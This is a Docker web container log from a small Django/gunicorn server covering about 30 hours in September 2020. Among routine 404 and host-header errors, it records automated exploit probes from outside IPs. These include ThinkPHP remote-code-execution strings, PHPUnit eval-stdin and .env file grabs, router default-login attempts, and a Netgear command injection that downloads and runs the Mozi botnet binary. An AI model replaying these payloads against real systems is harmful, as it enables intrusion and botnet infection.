+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:29 +0000] "GET /api-auth/login/?next=/api/v1/ HTTP/1.1" 200 2708 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:30 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m [2020-09-20 00:21:00 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:11)
+[36mweb_1  |[0m [2020-09-20 00:21:00 +0000] [11] [INFO] Worker exiting (pid: 11)
+[36mweb_1  |[0m [2020-09-20 00:21:00 +0000] [12] [INFO] Booting worker with pid: 12
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 103.145.13.24 - - [20/Sep/2020:00:39:31 +0000] "GET / HTTP/1.1" 404 2417 "-" "libwww-perl/6.47"
+[36mweb_1  |[0m Invalid HTTP_HOST header: 'tapestryadventures.com'. You may need to add 'tapestryadventures.com' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /
+[36mweb_1  |[0m 172.68.189.219 - - [20/Sep/2020:01:12:15 +0000] "HEAD / HTTP/1.1" 400 59114 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
+[36mweb_1  |[0m Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /cgi-bin/ViewLog.asp
+[36mweb_1  |[0m 181.143.101.194 - - [20/Sep/2020:02:13:57 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 400 59582 "-" "Hello, World"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 197.251.232.226 - - [20/Sep/2020:02:35:22 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+[36mweb_1  |[0m Not Found: /HNAP1/
+[36mweb_1  |[0m 115.99.213.74 - - [20/Sep/2020:02:50:20 +0000] "POST /HNAP1/ HTTP/1.0" 404 2454 "-" "-"
+[36mweb_1  |[0m Not Found: /robots.txt
+[36mweb_1  |[0m 194.180.179.58 - - [20/Sep/2020:04:52:54 +0000] "HEAD /robots.txt HTTP/1.0" 404 2462 "-" "-"
+[36mweb_1  |[0m [2020-09-20 05:05:24 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:9)
+[36mweb_1  |[0m [2020-09-20 05:05:24 +0000] [9] [INFO] Worker exiting (pid: 9)
+[36mweb_1  |[0m [2020-09-20 05:05:24 +0000] [13] [INFO] Booting worker with pid: 13
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 176.43.128.2 - - [20/Sep/2020:05:24:21 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 zgrab/0.x"
+[36mweb_1  |[0m Not Found: /solr/admin/info/system
+[36mweb_1  |[0m 45.146.164.186 - - [20/Sep/2020:05:33:22 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2509 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 45.146.164.186 - - [20/Sep/2020:05:36:20 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 2447 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 45.146.164.186 - - [20/Sep/2020:05:40:20 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 404 2481 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /index.php
+[36mweb_1  |[0m 45.146.164.186 - - [20/Sep/2020:05:41:47 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2579 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Invalid HTTP_HOST header: 'tapestryadventures.com'. You may need to add 'tapestryadventures.com' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /robots.txt
+[36mweb_1  |[0m 172.68.142.133 - - [20/Sep/2020:06:11:16 +0000] "GET /robots.txt HTTP/1.1" 400 59242 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+[36mweb_1  |[0m Invalid HTTP_HOST header: 'tapestryadventures.com'. You may need to add 'tapestryadventures.com' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /
+[36mweb_1  |[0m 172.68.141.72 - - [20/Sep/2020:06:11:16 +0000] "GET / HTTP/1.1" 400 59810 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 176.53.2.134 - - [20/Sep/2020:06:15:59 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
+[36mweb_1  |[0m Invalid HTTP_HOST header: 'tapestryadventures.com'. You may need to add 'tapestryadventures.com' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /
+[36mweb_1  |[0m 172.68.142.181 - - [20/Sep/2020:06:24:44 +0000] "GET / HTTP/1.1" 400 59423 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /api/jsonws/invoke
+[36mweb_1  |[0m 45.146.164.186 - - [20/Sep/2020:06:27:20 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 2487 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 79.140.156.190 - - [20/Sep/2020:07:40:58 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+[36mweb_1  |[0m Invalid HTTP_HOST header: 'tapestryadventures.com'. You may need to add 'tapestryadventures.com' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /
+[36mweb_1  |[0m 172.68.143.182 - - [20/Sep/2020:07:44:57 +0000] "HEAD / HTTP/1.1" 400 59114 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
+[36mweb_1  |[0m Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[36mweb_1  |[0m 45.146.164.186 - - [20/Sep/2020:08:19:10 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2585 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[36mweb_1  |[0m 45.146.164.186 - - [20/Sep/2020:08:46:04 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2586 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /.env
+[36mweb_1  |[0m 34.64.164.249 - - [20/Sep/2020:09:32:58 +0000] "GET /.env HTTP/1.1" 404 2444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+[36mweb_1  |[0m Not Found: /vendor/.env
+[36mweb_1  |[0m 34.64.164.249 - - [20/Sep/2020:09:32:58 +0000] "GET /vendor/.env HTTP/1.1" 404 2465 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+[36mweb_1  |[0m Not Found: /storage/.env
+[36mweb_1  |[0m 34.64.164.249 - - [20/Sep/2020:09:32:59 +0000] "GET /storage/.env HTTP/1.1" 404 2468 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+[36mweb_1  |[0m Not Found: /public/.env
+[36mweb_1  |[0m 34.64.164.249 - - [20/Sep/2020:09:32:59 +0000] "GET /public/.env HTTP/1.1" 404 2465 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 34.64.164.249 - - [20/Sep/2020:09:32:59 +0000] "POST / HTTP/1.1" 404 2415 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 91.232.195.48 - - [20/Sep/2020:09:48:03 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 156.96.112.211 - - [20/Sep/2020:10:32:26 +0000] "GET / HTTP/1.1" 404 2414 "-" "-"
+[36mweb_1  |[0m Not Found: /setup.cgi
+[36mweb_1  |[0m 202.83.42.132 - - [20/Sep/2020:11:40:48 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2620 "-" "-"
+[36mweb_1  |[0m Not Found: /HNAP1/
+[36mweb_1  |[0m 27.6.243.101 - - [20/Sep/2020:11:45:40 +0000] "POST /HNAP1/ HTTP/1.0" 404 2454 "-" "-"
+[36mweb_1  |[0m Not Found: /config/getuser
+[36mweb_1  |[0m 45.148.10.28 - - [20/Sep/2020:12:13:28 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 2485 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 181.113.119.134 - - [20/Sep/2020:12:17:01 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 185.65.163.32 - - [20/Sep/2020:12:19:35 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 167.248.133.52 - - [20/Sep/2020:12:22:31 +0000] "GET / HTTP/1.1" 404 2417 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 167.248.133.52 - - [20/Sep/2020:12:22:31 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 91.226.101.40 - - [20/Sep/2020:12:58:30 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[36mweb_1  |[0m Not Found: /boaform/admin/formLogin
+[36mweb_1  |[0m 39.77.85.152 - - [20/Sep/2020:13:22:44 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 2527 "-" "-"
+[36mweb_1  |[0m Invalid HTTP_HOST header: 'tapestryadventures.com'. You may need to add 'tapestryadventures.com' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /
+[36mweb_1  |[0m 172.68.133.38 - - [20/Sep/2020:14:12:27 +0000] "GET / HTTP/1.1" 400 59071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+[36mweb_1  |[0m Not Found: /hudson
+[36mweb_1  |[0m 192.241.236.239 - - [20/Sep/2020:15:05:29 +0000] "GET /hudson HTTP/1.1" 404 2450 "-" "Mozilla/5.0 zgrab/0.x"
+[36mweb_1  |[0m Not Found: /TP/public/index.php
+[36mweb_1  |[0m 122.224.111.182 - - [20/Sep/2020:16:10:01 +0000] "GET /TP/public/index.php HTTP/1.1" 404 2489 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /TP/index.php
+[36mweb_1  |[0m 122.224.111.182 - - [20/Sep/2020:16:10:03 +0000] "GET /TP/index.php HTTP/1.1" 404 2468 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /thinkphp/html/public/index.php
+[36mweb_1  |[0m 122.224.111.182 - - [20/Sep/2020:16:10:05 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2522 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /html/public/index.php
+[36mweb_1  |[0m 122.224.111.182 - - [20/Sep/2020:16:10:05 +0000] "GET /html/public/index.php HTTP/1.1" 404 2495 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /public/index.php
+[36mweb_1  |[0m 122.224.111.182 - - [20/Sep/2020:16:10:06 +0000] "GET /public/index.php HTTP/1.1" 404 2480 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /TP/html/public/index.php
+[36mweb_1  |[0m 122.224.111.182 - - [20/Sep/2020:16:10:07 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 2504 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /elrekt.php
+[36mweb_1  |[0m 122.224.111.182 - - [20/Sep/2020:16:10:10 +0000] "GET /elrekt.php HTTP/1.1" 404 2462 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /index.php
+[36mweb_1  |[0m 122.224.111.182 - - [20/Sep/2020:16:10:12 +0000] "GET /index.php HTTP/1.1" 404 2459 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 122.224.111.182 - - [20/Sep/2020:16:10:13 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+[36mweb_1  |[0m Not Found: /boaform/admin/formLogin
+[36mweb_1  |[0m 125.41.73.234 - - [20/Sep/2020:16:30:24 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 2527 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 88.119.136.41 - - [20/Sep/2020:16:40:19 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 193.239.147.184 - - [20/Sep/2020:17:13:42 +0000] "HEAD / HTTP/1.0" 404 2414 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 139.162.106.181 - - [20/Sep/2020:17:13:52 +0000] "GET / HTTP/1.1" 404 2414 "-" "HTTP Banner Detection (https://security.ipip.net)"
+[36mweb_1  |[0m Invalid HTTP_HOST header: 'tapestryadventures.com'. You may need to add 'tapestryadventures.com' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /
+[36mweb_1  |[0m 172.68.141.72 - - [20/Sep/2020:17:19:15 +0000] "GET / HTTP/1.1" 400 59810 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 203.83.176.138 - - [20/Sep/2020:17:45:45 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 71.127.198.199 - - [20/Sep/2020:17:52:51 +0000] "GET / HTTP/1.1" 404 2414 "-" "-"
+[36mweb_1  |[0m Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /cgi-bin/ViewLog.asp
+[36mweb_1  |[0m 41.213.138.16 - - [20/Sep/2020:18:04:53 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 400 59575 "-" "B4ckdoor-owned-you"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 2.187.25.39 - - [20/Sep/2020:18:07:31 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 192.35.168.251 - - [20/Sep/2020:18:22:44 +0000] "GET / HTTP/1.1" 404 2417 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 192.35.168.251 - - [20/Sep/2020:18:22:44 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 156.96.61.142 - - [20/Sep/2020:18:37:20 +0000] "GET / HTTP/1.1" 404 2417 "-" "libwww-perl/6.47"
+[36mweb_1  |[0m Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /
+[36mweb_1  |[0m 220.133.137.85 - - [20/Sep/2020:18:52:50 +0000] "GET / HTTP/1.1" 400 57996 "-" "Mozilla/5.0"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 185.168.173.121 - - [20/Sep/2020:20:34:05 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[36mweb_1  |[0m Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /cgi-bin/ViewLog.asp
+[36mweb_1  |[0m 41.213.138.16 - - [20/Sep/2020:20:48:17 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 400 59575 "-" "B4ckdoor-owned-you"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 162.142.125.33 - - [20/Sep/2020:21:04:07 +0000] "GET / HTTP/1.1" 404 2417 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 162.142.125.33 - - [20/Sep/2020:21:04:07 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 162.243.128.185 - - [20/Sep/2020:21:11:16 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 zgrab/0.x"
+[36mweb_1  |[0m [2020-09-20 21:28:23 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:8)
+[36mweb_1  |[0m [2020-09-20 21:28:23 +0000] [8] [INFO] Worker exiting (pid: 8)
+[36mweb_1  |[0m [2020-09-20 21:28:23 +0000] [14] [INFO] Booting worker with pid: 14
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 103.145.13.186 - - [20/Sep/2020:21:44:31 +0000] "GET / HTTP/1.1" 404 2414 "-" "-"
+[36mweb_1  |[0m Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /
+[36mweb_1  |[0m 171.226.185.44 - - [20/Sep/2020:23:36:42 +0000] "GET / HTTP/1.1" 400 57996 "-" "Mozilla/5.0"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 52.86.148.168 - - [20/Sep/2020:23:38:08 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 zgrab/0.x"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 94.236.199.18 - - [20/Sep/2020:23:51:46 +0000] "GET / HTTP/1.0" 404 2417 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[36mweb_1  |[0m Not Found: /solr/admin/info/system
+[36mweb_1  |[0m 45.146.164.186 - - [20/Sep/2020:23:57:57 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2509 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:00:10:43 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 2447 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:00:25:35 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 404 2481 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /index.php
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:00:32:23 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2579 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 198.143.133.154 - - [21/Sep/2020:00:46:56 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 190.183.131.190 - - [21/Sep/2020:01:02:04 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+[36mweb_1  |[0m Not Found: /HNAP1/
+[36mweb_1  |[0m 222.138.226.51 - - [21/Sep/2020:01:20:49 +0000] "POST /HNAP1/ HTTP/1.0" 404 2454 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 74.120.14.52 - - [21/Sep/2020:01:57:52 +0000] "GET / HTTP/1.1" 404 2417 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 74.120.14.52 - - [21/Sep/2020:01:57:52 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[36mweb_1  |[0m Not Found: /HNAP1/
+[36mweb_1  |[0m 210.18.153.133 - - [21/Sep/2020:02:11:03 +0000] "POST /HNAP1/ HTTP/1.0" 404 2454 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 177.8.216.26 - - [21/Sep/2020:02:22:14 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 80.82.77.240 - - [21/Sep/2020:02:30:56 +0000] "GET / HTTP/1.0" 404 2413 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 34.210.124.133 - - [21/Sep/2020:03:22:07 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /api/jsonws/invoke
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:03:36:51 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 2487 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 128.14.134.134 - - [21/Sep/2020:03:42:20 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+[36mweb_1  |[0m Not Found: /boaform/admin/formLogin
+[36mweb_1  |[0m 27.222.65.215 - - [21/Sep/2020:04:57:03 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 2535 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 164.68.112.178 - - [21/Sep/2020:05:08:44 +0000] "GET / HTTP/1.0" 404 2413 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
+[36mweb_1  |[0m Not Found: /portal/redlion
+[36mweb_1  |[0m 192.241.235.168 - - [21/Sep/2020:05:39:40 +0000] "GET /portal/redlion HTTP/1.1" 404 2474 "-" "Mozilla/5.0 zgrab/0.x"
+[36mweb_1  |[0m Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /echo.php
+[36mweb_1  |[0m 5.188.210.227 - - [21/Sep/2020:05:47:52 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 400 58977 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+[36mweb_1  |[0m Not Found: /.env
+[36mweb_1  |[0m 62.4.21.193 - - [21/Sep/2020:06:39:52 +0000] "GET /.env HTTP/1.1" 404 2444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 62.4.21.193 - - [21/Sep/2020:06:39:53 +0000] "POST / HTTP/1.1" 404 2415 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
